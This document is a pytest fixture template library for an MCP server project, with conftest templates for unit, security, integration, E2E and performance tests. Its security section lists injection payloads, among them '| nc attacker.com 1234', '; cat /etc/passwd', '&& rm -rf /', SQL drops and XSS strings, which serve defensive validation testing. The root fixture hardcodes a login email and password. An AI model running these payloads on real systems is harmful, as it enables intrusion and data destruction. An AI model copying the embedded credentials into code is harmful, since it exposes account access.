# Fixture Template Library
## FastMCP Testing Patterns for atoms-mcp-prod

This document defines reusable fixture patterns for each conftest.py level.

---

## 1. ROOT conftest.py (tests/conftest.py)

### Overview
- Session-scoped shared fixtures
- pytest hooks and markers
- Environment setup
- Shared test data

### Template

```python
\"\"\"Root pytest configuration and shared fixtures.\"\"\"
import os
import sys
import pytest
import asyncio
from pathlib import Path
from typing import Any, Dict, AsyncGenerator

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from dotenv import load_dotenv
load_dotenv()
load_dotenv(".env.local", override=True)


def pytest_configure(config):
    \"\"\"Register custom markers.\"\"\"
    markers = [
        "unit: unit tests (fast, <1s, in-memory)",
        "integration: integration tests (need live services)",
        "e2e: end-to-end tests (full deployment)",
        "performance: performance benchmarks",
        "security: security/injection tests",
        "mock_only: tests using mocks (no live services)",
        "requires_db: tests requiring Supabase",
        "requires_auth: tests requiring OAuth",
        "slow: tests taking >5 seconds",
        "client_process: tests spawning subprocess",
    ]
    for marker in markers:
        config.addinivalue_line("markers", marker)


@pytest.fixture(scope="session")
def event_loop():
    \"\"\"Create event loop for async tests.\"\"\"
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    yield loop
    loop.close()


@pytest.fixture
def env_config() -> Dict[str, str]:
    \"\"\"Provide environment config.\"\"\"
    return {
        \"supabase_url\": os.getenv(\"NEXT_PUBLIC_SUPABASE_URL\", \"\"),
        \"supabase_key\": os.getenv(\"NEXT_PUBLIC_SUPABASE_ANON_KEY\", \"\"),
        \"fastmcp_server_auth\": os.getenv(\"FASTMCP_SERVER_AUTH\", \"\"),
        \"demo_user\": os.getenv(\"FASTMCP_DEMO_USER\", \"test-user\"),
        \"demo_pass\": os.getenv(\"FASTMCP_DEMO_PASS\", \"test-pass\"),
    }


@pytest.fixture(scope=\"session\")
def shared_supabase_jwt():
    \"\"\"Get Supabase JWT once and reuse to avoid rate limits.\"\"\"
    from supabase import create_client

    url = os.getenv(\"NEXT_PUBLIC_SUPABASE_URL\")
    key = os.getenv(\"NEXT_PUBLIC_SUPABASE_ANON_KEY\")

    if not url or not key:
        pytest.skip(\"Supabase not configured\")

    client = create_client(url, key)
    try:
        auth_response = client.auth.sign_in_with_password({
            \"email\": \"kooshapari@kooshapari.com\",
            \"password\": \"118118\"
        })
        if auth_response.session:
            return auth_response.session.access_token
    except Exception as e:
        pytest.skip(f\"Could not authenticate: {e}\")

    pytest.skip(\"No session obtained\")


@pytest.fixture(scope=\"session\")
def check_server_running():
    \"\"\"Check if MCP server is running on localhost:8000.\"\"\"
    import httpx
    try:
        response = httpx.get(\"http://127.0.0.1:8000/health\", timeout=2.0)
        if response.status_code == 200:
            return True
    except Exception:
        pass
    pytest.skip(\"MCP server not running on http://127.0.0.1:8000\")
```

---

## 2. UNIT/TOOLS conftest.py (tests/unit/tools/conftest.py)

### Overview
- FastMCP Client (in-memory) fixture
- MCP server fixture (session scope)
- Parametrization helpers
- Test data factories

### Template

```python
\"\"\"Fixtures for unit tool tests.\"\"\"
import pytest
from unittest.mock import AsyncMock, MagicMock
from typing import Callable, Any, Dict, Optional

# These fixtures support in-memory testing with FastMCP Client
# See: FastMCP docs - \"In-Memory Testing\" section


@pytest.fixture(scope=\"session\")
def mcp_server():
    \"\"\"Create MCP server instance for all tests in this module.
    
    Returns the configured FastMCP server for use with Client(server).
    This is session-scoped to avoid recreating the server for each test.
    \"\"\"
    from fastmcp import FastMCP
    
    server = FastMCP(\"test-server\")
    
    # Register tools (entity_tool, workflow_tool, etc.)
    # This would be populated by importing tool implementations
    # @server.tool decorator registrations happen here
    
    return server


@pytest.fixture
async def mcp_client_inmemory(mcp_server):
    \"\"\"Provide in-memory MCP client.
    
    Usage:
        async def test_entity_creation(mcp_client_inmemory):
            result = await mcp_client_inmemory.call_tool(
                \"entity_tool\",
                {\"operation\": \"create\", \"entity_type\": \"organization\", ...}
            )
            assert result.success
    
    Benefits:
        - Deterministic (no network)
        - Fast (<1ms per call)
        - Full debugger support
        - No external service dependencies
    \"\"\"
    from fastmcp import Client
    
    async with Client(mcp_server) as client:
        yield client


@pytest.fixture
def mcp_server_mock():
    \"\"\"Mock MCP server for testing error conditions.\"\"\"
    mock_server = AsyncMock()
    mock_server.call_tool = AsyncMock()
    mock_server.list_tools = MagicMock()
    return mock_server


@pytest.fixture
def parametrize_entity_types():
    \"\"\"Provide entity type variations for parametrization.
    
    Usage:
        @pytest.mark.parametrize(\"entity_type\", parametrize_entity_types())
        async def test_entity_operation(mcp_client_inmemory, entity_type):
            result = await mcp_client_inmemory.call_tool(
                \"entity_tool\",
                {\"operation\": \"list\", \"entity_type\": entity_type}
            )
            assert result.success
    \"\"\"
    return [
        \"organization\",
        \"project\",
        \"document\",
        \"requirement\",
        \"test_entity\",
        \"property\",
    ]


@pytest.fixture
def parametrize_operations():
    \"\"\"Provide operation variations.\"\"\"
    return [\"create\", \"read\", \"update\", \"delete\", \"list\", \"search\"]


@pytest.fixture
def parametrize_scenarios():
    \"\"\"Provide scenario variations (success, error, edge cases).\"\"\"
    return [\n        {\"name\": \"success\", \"expect_error\": False},
        {\"name\": \"invalid_input\", \"expect_error\": True},
        {\"name\": \"missing_required\", \"expect_error\": True},
        {\"name\": \"edge_case_empty\", \"expect_error\": False},
    ]
```

---

## 3. UNIT/INFRASTRUCTURE conftest.py

### Overview
- Database mock fixture
- Auth mock fixture
- Supabase client mock
- Transaction mock

### Template

```python
\"\"\"Fixtures for infrastructure unit tests.\"\"\"
import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from typing import Dict, Any


@pytest.fixture
def database_mock():
    \"\"\"Mock database adapter.\"\"\"
    mock_db = AsyncMock()
    mock_db.query = AsyncMock()
    mock_db.execute = AsyncMock()
    mock_db.transaction = AsyncMock()
    return mock_db


@pytest.fixture
def auth_mock():
    \"\"\"Mock authentication provider.\"\"\"
    mock_auth = AsyncMock()
    mock_auth.verify_token = AsyncMock(return_value=True)
    mock_auth.get_user = AsyncMock(return_value={\"id\": \"test-user\", \"email\": \"test@example.com\"})
    mock_auth.create_session = AsyncMock(return_value=\"session-token\")
    return mock_auth


@pytest.fixture
def supabase_client_mock():
    \"\"\"Mock Supabase client.\"\"\"
    mock_client = MagicMock()
    mock_client.table = MagicMock()
    mock_client.auth = MagicMock()
    mock_client.storage = MagicMock()
    return mock_client


@pytest.fixture
def rate_limiter_mock():
    \"\"\"Mock rate limiter.\"\"\"
    mock_limiter = AsyncMock()
    mock_limiter.check = AsyncMock(return_value=True)
    mock_limiter.is_limited = AsyncMock(return_value=False)
    return mock_limiter


@pytest.fixture
def rls_context_mock():
    \"\"\"Mock Row-Level Security context.\"\"\"
    return {
        \"auth.uid()\": \"test-user-id\",
        \"auth.jwt()\": \"test-jwt-token\",
    }
```

---

## 4. UNIT/SECURITY conftest.py

### Overview
- Injection payload fixtures
- Malformed input fixtures
- Security test data

### Template

```python
\"\"\"Fixtures for security tests.\"\"\"
import pytest
from typing import List, Dict, Any


@pytest.fixture
def injection_payloads() -> Dict[str, List[str]]:
    \"\"\"SQL/NoSQL injection payloads.\"\"\"
    return {
        \"sql_injection\": [
            \"' OR '1'='1\",
            \"'; DROP TABLE users; --\",
            \"1 UNION SELECT * FROM passwords\",
        ],
        \"command_injection\": [
            \"; cat /etc/passwd\",
            \"| nc attacker.com 1234\",
            \"&& rm -rf /\",
        ],
        \"xss_payloads\": [
            \"<script>alert('xss')</script>\",
            \"<img src=x onerror=alert('xss')>\",
            \"javascript:alert('xss')\",
        ],
    }


@pytest.fixture
def malformed_inputs() -> Dict[str, Any]:
    \"\"\"Malformed inputs to test validation.\"\"\"
    return {
        \"invalid_json\": \"{invalid json}\",
        \"invalid_uuid\": \"not-a-uuid\",
        \"null_values\": None,
        \"empty_strings\": \"\",
        \"huge_payload\": \"x\" * (10 * 1024 * 1024),  # 10MB
        \"invalid_types\": {
            \"string_as_int\": \"not an int\",
            \"dict_as_list\": {\"key\": \"value\"},
        },
    }


@pytest.fixture
def auth_bypass_attempts() -> List[Dict[str, Any]]:
    \"\"\"Authentication bypass attempts.\"\"\"
    return [
        {\"name\": \"no_token\", \"token\": None},
        {\"name\": \"invalid_token\", \"token\": \"invalid-token\"},
        {\"name\": \"expired_token\", \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"},
        {\"name\": \"wrong_signature\", \"token\": \"valid.jwt.wrong_sig\"},
    ]
```

---

## 5. INTEGRATION conftest.py

### Overview
- MCP client (HTTP) fixture
- Live Supabase fixture
- Request mock fixture
- Integration marker helpers

### Template

```python
\"\"\"Fixtures for integration tests.\"\"\"
import pytest
from typing import AsyncGenerator
import httpx
from unittest.mock import AsyncMock


@pytest.fixture
async def mcp_client_http(check_server_running) -> AsyncGenerator:
    \"\"\"MCP client via HTTP transport.
    
    Requires: MCP server running on localhost:8000
    Usage:
        @pytest.mark.integration
        async def test_http_api(mcp_client_http):
            result = await mcp_client_http.call_tool(
                \"entity_tool\",
                {\"operation\": \"list\", \"entity_type\": \"organization\"}
            )
            assert result.success
    \"\"\"
    from fastmcp import Client
    from fastmcp.client.transports import StreamableHttpTransport
    
    transport = StreamableHttpTransport(\"http://127.0.0.1:8000/mcp\")
    async with Client(transport=transport) as client:
        yield client


@pytest.fixture
def live_supabase():
    \"\"\"Live Supabase client for integration tests.
    
    Requires: NEXT_PUBLIC_SUPABASE_URL and NEXT_PUBLIC_SUPABASE_ANON_KEY
    Usage:
        @pytest.mark.integration
        @pytest.mark.requires_db
        def test_database_operation(live_supabase):
            result = live_supabase.table('users').select('*').execute()
            assert result.success
    \"\"\"
    import os
    from supabase import create_client
    
    url = os.getenv(\"NEXT_PUBLIC_SUPABASE_URL\")
    key = os.getenv(\"NEXT_PUBLIC_SUPABASE_ANON_KEY\")
    
    if not url or not key:
        pytest.skip(\"Supabase not configured\")
    
    return create_client(url, key)


@pytest.fixture
def request_mock():
    \"\"\"Mock HTTP requests for testing API interactions.\"\"\"
    mock_request = AsyncMock()
    mock_request.get = AsyncMock()
    mock_request.post = AsyncMock()
    mock_request.put = AsyncMock()
    mock_request.delete = AsyncMock()
    return mock_request


@pytest.fixture
def httpx_client_mock():
    \"\"\"Mock httpx.AsyncClient for testing HTTP calls.\"\"\"
    mock_client = AsyncMock(spec=httpx.AsyncClient)
    mock_client.post = AsyncMock()
    mock_client.get = AsyncMock()
    return mock_client
```

---

## 6. E2E conftest.py

### Overview
- Full deployment fixture
- End-to-end client
- Workflow scenarios

### Template

```python
\"\"\"Fixtures for end-to-end tests.\"\"\"
import pytest
from typing import AsyncGenerator


@pytest.fixture
async def full_deployment() -> AsyncGenerator:
    \"\"\"Full MCP deployment for E2E testing.
    
    Sets up: Server + HTTP transport + Live Supabase
    Usage:
        @pytest.mark.e2e
        async def test_complete_workflow(full_deployment):
            server, http_client, db_client = full_deployment
            result = await http_client.call_tool(...)
            assert result.success
    \"\"\"
    # Start server in-process or subprocess
    # Connect HTTP client
    # Connect database
    # Yield tuple
    # Cleanup
    pass


@pytest.fixture
async def end_to_end_client(full_deployment):
    \"\"\"Client configured for E2E scenarios.
    
    Pre-configured with auth, database, all services.
    \"\"\"
    pass


@pytest.fixture
def workflow_scenarios():
    \"\"\"Pre-defined E2E workflow scenarios.\"\"\"
    return [
        {
            \"name\": \"create_org_and_project\",
            \"steps\": [
                {\"tool\": \"workspace_tool\", \"operation\": \"create_organization\"},
                {\"tool\": \"workspace_tool\", \"operation\": \"create_project\"},
            ],
        },
    ]
```

---

## 7. PERFORMANCE conftest.py

### Overview
- Load generator fixture
- Timing tracker
- Metrics collector

### Template

```python
\"\"\"Fixtures for performance tests.\"\"\"
import pytest
import time
from typing import Dict, List


@pytest.fixture
def load_generator():
    \"\"\"Generate load for performance testing.\"\"\"
    async def generate_requests(count: int, request_func):
        import asyncio
        tasks = [request_func() for _ in range(count)]
        return await asyncio.gather(*tasks)
    
    return generate_requests


@pytest.fixture
def timing_tracker():
    \"\"\"Track and report timing metrics.
    
    Usage:
        async def test_performance(timing_tracker):
            with timing_tracker.measure(\"entity_creation\"):
                result = await client.call_tool(...)
            
            timing_tracker.report()  # Prints timing stats
    \"\"\"
    class TimingTracker:
        def __init__(self):
            self.timings: Dict[str, List[float]] = {}
        
        def measure(self, name: str):
            from contextlib import contextmanager
            
            @contextmanager
            def timer():
                start = time.time()
                try:
                    yield
                finally:
                    elapsed = time.time() - start
                    if name not in self.timings:
                        self.timings[name] = []
                    self.timings[name].append(elapsed)
            
            return timer()
        
        def report(self) -> Dict[str, Dict[str, float]]:
            import statistics
            results = {}
            for name, times in self.timings.items():
                results[name] = {
                    \"min\": min(times),
                    \"max\": max(times),
                    \"avg\": statistics.mean(times),
                    \"median\": statistics.median(times),
                    \"count\": len(times),
                }
            return results
    
    return TimingTracker()


@pytest.fixture
def metrics_collector():
    \"\"\"Collect performance metrics.\"\"\"
    class MetricsCollector:
        def __init__(self):
            self.metrics = {}
        
        def record(self, name: str, value: float):
            if name not in self.metrics:
                self.metrics[name] = []
            self.metrics[name].append(value)
        
        def get_stats(self, name: str):
            import statistics
            values = self.metrics.get(name, [])
            return {
                \"count\": len(values),
                \"min\": min(values) if values else 0,
                \"max\": max(values) if values else 0,
                \"avg\": statistics.mean(values) if values else 0,
            }
    
    return MetricsCollector()
```

---

## Usage Patterns

### Pattern 1: In-Memory Unit Test
```python
@pytest.mark.unit
async def test_entity_creation(mcp_client_inmemory):
    result = await mcp_client_inmemory.call_tool(
        \"entity_tool\",
        {\"operation\": \"create\", \"entity_type\": \"organization\", \"data\": {...}}
    )
    assert result.success
```

### Pattern 2: Parametrized Test
```python
@pytest.mark.unit
@pytest.mark.parametrize(\"entity_type\", [\"organization\", \"project\", \"document\"])
async def test_entity_list_by_type(mcp_client_inmemory, entity_type):
    result = await mcp_client_inmemory.call_tool(
        \"entity_tool\",
        {\"operation\": \"list\", \"entity_type\": entity_type}
    )
    assert result.success
```

### Pattern 3: Integration Test with Mock
```python
@pytest.mark.integration
@pytest.mark.requires_db
def test_database_auth(live_supabase, shared_supabase_jwt):
    # Use live_supabase with JWT
    pass
```

### Pattern 4: Security Test
```python
@pytest.mark.security
@pytest.mark.parametrize(\"payload\", injection_payloads()[\"sql_injection\"])
async def test_sql_injection_prevention(mcp_client_inmemory, payload):
    result = await mcp_client_inmemory.call_tool(
        \"query_tool\",
        {\"operation\": \"search\", \"query\": payload}
    )
    assert not result.success  # Should fail validation
```

---

## Key Principles

1. **Fast Tests**: In-memory unit tests should complete in <1ms
2. **Deterministic**: No randomness, consistent results
3. **Isolated**: No shared state between tests
4. **Debuggable**: Full breakpoint support
5. **Async/Await**: All fixtures support async patterns
6. **Marked**: All tests have appropriate markers
7. **Parametrized**: Variations use `@pytest.mark.parametrize`
8. **Documented**: Clear docstrings on all fixtures

---

## References

- FastMCP Testing: https://docs.fastmcp.io/testing
- Pytest Fixtures: https://docs.pytest.org/en/stable/how-to-use-fixtures.html
- Pytest Parametrize: https://docs.pytest.org/en/stable/how-to-parametrize.html
- Async Testing: https://docs.pytest.org/en/stable/how-to-write-plugins.html
